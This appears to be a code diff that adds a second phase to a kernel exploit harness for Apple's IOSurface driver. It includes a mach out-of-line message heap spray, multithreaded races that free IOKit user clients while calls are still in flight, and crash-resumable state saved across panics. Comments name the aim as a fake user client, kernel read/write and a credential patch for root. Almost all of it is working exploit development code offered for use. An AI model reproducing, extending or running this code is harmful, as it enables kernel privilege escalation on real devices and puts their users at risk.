@@ -937,6 +937,7 @@ NSString *ModIsurfUAF(void) {
 NSString *ModCVE86950(void);
 NSString *ModShading5Force(void);
 BOOL RootProbe(void);
+
 static void stageK(int shape) {
     EV("[uaf][K] === stage K: deref canary (crash oracle) ===");
     EV("[uaf][K] writing crash-forensics file before firing");
@@ -1247,4 +1248,206 @@ static void stageH(int shape) {
         }
     }
     IOServiceClose(c);
+}
+
+// ---------------------------------------------------------------------------
+// Phase 2 - the user-client lifetime UAF that the device panic PROVED.
+// panic-full-2026-11-20-184853.0002.ips: com.apple.iokit.IOSurface(393.2.9) in
+// the backtrace, esr=0x96000005 data abort, far=0x8 (NULL+8), reached from
+// sel17 dispatch while V_BIG closed 8 user clients under 12 spam threads.
+// The PoC's registry stale-read does NOT reproduce on 26.2b1 (G: every out
+// shape = BadArgument; E2 10/10 at every size = a plain re-insert; K1 0/10) -
+// so the exploitable object is the USER CLIENT itself (or the IOSurface it
+// holds), freed by racing IOServiceClose against in-flight externalMethod.
+//
+// This phase makes that crash CONTROLLED:
+//   U  crash-resumable units (rs112477.state on disk: a panic = reboot, the
+//      next launch resumes at the unit that died)
+//   R  the reclaim groom: mach OOL messages of calibrated size, canary-filled,
+//      sent AFTER the free window while the racing call is still in flight.
+//      A panic whose far/registers carry our canary = the freed user-client
+//      slot is attacker-controlled -> fake user client -> kernel R/W ->
+//      ucred patch = uid 0.
+//   KCE (kernelcache header) is dumped FIRST every launch - the phase-1 panic
+//      ate it, so nothing that can panic runs before it.
+// ---------------------------------------------------------------------------
+static const int P2_SIZES[] = { 64, 96, 128, 160, 192, 224, 256, 320, 384, 448, 512 };
+static const int P2_NSZ = (int)(sizeof P2_SIZES / sizeof P2_SIZES[0]);
+
+// ---- the OOL groom: kernel kalloc(size) copies that hold our canary --------
+static mach_port_t gSprayPort[128];
+static int gSprayN = 0;
+
+static void oolFree(void) {
+    for (int i = 0; i < gSprayN; i++) {
+        mach_port_destroy(mach_task_self(), gSprayPort[i]);   // releases the queue too
+    }
+    gSprayN = 0;
+}
+
+static int oolSpray(int n, size_t size, uint32_t tag) {
+    oolFree();
+    if (n > 128) n = 128;
+    if (size > 65536) size = 65536;
+    uint8_t *buf = calloc(1, size ? size : 8);
+    if (!buf) return 0;
+    uint64_t *q = (uint64_t *)buf;
+    size_t nq = size / 8;
+    for (size_t k = 0; k < nq; k++)
+        q[k] = 0xC0FFEE5A00000000ull | (((uint64_t)size & 0xffff) << 16) | tag;
+    for (int i = 0; i < n; i++) {
+        mach_port_t p = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS)
+            break;
+        if (mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
+            mach_port_destroy(mach_task_self(), p);
+            break;
+        }
+        typedef struct {
+            mach_msg_header_t hdr;
+            mach_msg_body_t body;
+            mach_msg_ool_descriptor_t ool;
+        } pmsg_t;
+        pmsg_t m;
+        memset(&m, 0, sizeof m);
+        m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+        m.hdr.msgh_size = sizeof m;
+        m.hdr.msgh_remote_port = p;
+        m.hdr.msgh_id = 1000 + i;
+        m.body.msgh_descriptor_count = 1;
+        m.ool.address = buf;
+        m.ool.size = (mach_msg_size_t)size;
+        m.ool.copy = MACH_MSG_VIRTUAL_COPY;
+        m.ool.deallocate = FALSE;
+        kern_return_t r = mach_msg(&m.hdr, MACH_SEND_MSG, sizeof m, 0, MACH_PORT_NULL,
+                                   MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+        if (r != KERN_SUCCESS) {
+            mach_port_destroy(mach_task_self(), p);
+            continue;
+        }
+        gSprayPort[gSprayN++] = p;
+    }
+    free(buf);
+    return gSprayN;
+}
+
+// ---- crash-resumable state (a panic ends the launch; the file survives) ----
+static int p2Unit = 0, p2Round = 0;
+
+static void p2Load(void) {
+    FILE *f = fopen(g_evpath, "r");
+    if (!f) return;
+    char line[256];
+    while (fgets(line, sizeof line, f))
+        if (sscanf(line, "P2STATE unit=%d round=%d", &p2Unit, &p2Round) == 2) { /* last one wins */ }
+    fclose(f);
+    EV("[uaf][P2] resuming at unit=%d round=%d", p2Unit, p2Round);
+}
+static void p2Save(void) {
+    if (!g_ev) g_ev = fopen(g_evpath, "a");
+    if (g_ev) { fprintf(g_ev, "P2STATE unit=%d round=%d\n", p2Unit, p2Round); fflush(g_ev); }
+}
+
+// ---- the race units ---------------------------------------------------------
+// one round = spray(canary) -> setup -> free window -> reclaim -> in-flight
+// spam keeps calling into the freed object -> the crash (if any) names our bytes
+static void p2_unit(int u, int round) {
+    int S = P2_SIZES[round % P2_NSZ];
+    uint32_t tag = (uint32_t)round;
+    io_connect_t c = 0; mach_port_t wp = newWakePort();
+    uint64_t in[3] = {1, 2, 3};
+    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { dropPort(wp); return; }
+
+    int nconn = 1, nspam = 2, dly = 60 * round;
+    switch (u) {
+        case 1: nconn = 4; nspam = 3; break;                 // cross-connection
+        case 3: nconn = 8; nspam = 12; break;                // the proven V_BIG shape
+        case 5: nconn = 1; nspam = 1; break;                 // close-then-spam control
+    }
+    dly %= 2000;
+
+    io_connect_t cs[8]; int have[8] = {0};
+    for (int i = 0; i < nconn && i < 8; i++) {
+        have[i] = (IOServiceOpen(gSvc, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
+        if (have[i]) callSel(cs[i], SEL_REG, in, 24, 1, wp);
+    }
+
+    if (u == 2) {
+        // surface churn only: no close race
+        gSpamConn = cs[0]; gSpamShape = 1; gSpamRun = 1;
+        pthread_t th[2]; pthread_create(&th[0], NULL, spamReg, NULL);
+        pthread_create(&th[1], NULL, spamReg, NULL);
+        for (int i = 0; i < 32; i++) { IOSurfaceRef_ s = mkSurface(); if (s) CFRelease(s); usleep(2000); }
+        gSpamRun = 0; pthread_join(th[0], NULL); pthread_join(th[1], NULL);
+        for (int i = 0; i < nconn && i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
+        dropPort(wp); return;
+    }
+
+    // spawn the spam: async sel17 in flight on the live connection
+    io_connect_t spamc = cs[nconn > 1 ? 1 : 0];
+    gSpamConn = spamc; gSpamShape = 1; gSpamRun = 1; gSpamCount = 0;
+    pthread_t th[12];
+    int nth = 0;
+    for (int i = 0; i < nspam && nth < 12; i++) pthread_create(&th[nth++], NULL, spamReg, NULL);
+    usleep(dly);
+
+    // the free window: u==3 reproduces the panicking shape exactly - ALL 8
+    // clients torn down (30us apart, as in V_BIG) while the spam threads run
+    if (have[0]) {
+        IOServiceClose(cs[0]); have[0] = 0;
+        EV("[uaf][P2] unit=%d round=%d freed client#0 after %dus", u, round, dly);
+    }
+    if (u == 1 || u == 3) {
+        for (int i = 1; i < nconn && i < 8; i++) {
+            if (have[i]) { IOServiceClose(cs[i]); have[i] = 0; }
+            usleep(30);
+        }
+    }
+
+    // the reclaim: OOL copies of size S, canary tag=round, land in the free window
+    int sprayed = oolSpray(64, (size_t)S, tag);
+    EV("[uaf][P2] unit=%d round=%d OOL reclaim sprays=%d size=%d tag=%u", u, round, sprayed, S, tag);
+    p2Save();
+    usleep(2000);   // in-flight spam keeps calling into the freed client
+
+    gSpamRun = 0;
+    for (int i = 0; i < nth; i++) pthread_join(th[i], NULL);
+    EV("[uaf][P2] unit=%d round=%d survived (spam=%llu)", u, round, (unsigned long long)gSpamCount);
+
+    if (u == 3) { for (int i = 0; i < 32; i++) { IOSurfaceRef_ s = mkSurface(); if (s) CFRelease(s); } }
+    oolFree();
+    for (int i = 0; i < nconn && i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
+    dropPort(wp);
+}
+
+NSString *ModIsurfUAF2(void) {
+    p2Load();
+    // KCE FIRST: the phase-1 panic ate the dump, so nothing crash-prone runs
+    // before the kernelcache evidence is on disk
+    if (!g_ev) g_ev = fopen(g_evpath, "a");
+    stageKCE();
+    AveSetStatus(@"112477 phase 2: user-client UAF reclaim");
+
+    int shape = 1;   // measured: sel17 accepts async shapes 1/2/3 only
+    if (!gSvc && findService() != 0) return @"112477 P2: no IOSurface service";
+
+    for (int r = 0; r < 12; r++, p2Round++) {
+        EV("[uaf][P2] ---- unit %d round %d ----", p2Unit, p2Round);
+        p2Save();
+        p2_unit(p2Unit, p2Round);
+    }
+    EV("[uaf][P2] unit %d: 12 rounds survived - advancing", p2Unit);
+    p2Unit++;
+    p2Round = 0;
+    p2Save();
+    if (p2Unit >= 7) return @"112477 P2: all units survived, no panic - widen the matrix";
+
+    for (int r = 0; r < 12; r++, p2Round++) {
+        EV("[uaf][P2] ---- unit %d round %d ----", p2Unit, p2Round);
+        p2Save();
+        p2_unit(p2Unit, p2Round);
+    }
+    EV("[uaf][P2] RESUME-STOP: unit %d done, next launch continues at the next unit", p2Unit);
+    return S(@"112477 P2: units 0..%d survived 12 rounds each (OOL reclaim armed)",
+              p2Unit);
 }
